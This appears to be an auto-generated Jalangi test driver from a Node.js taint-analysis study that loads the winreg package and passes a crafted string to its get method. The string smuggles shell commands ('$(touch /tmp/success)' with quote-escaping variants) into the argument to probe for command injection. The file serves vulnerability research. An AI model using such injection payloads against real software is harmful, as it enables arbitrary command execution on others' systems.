// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/winreg/node_modules/winreg');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = function(){};
new PUT["prototype"]["get"](x0,x1)();
} catch (e) {
	console.log(e);
}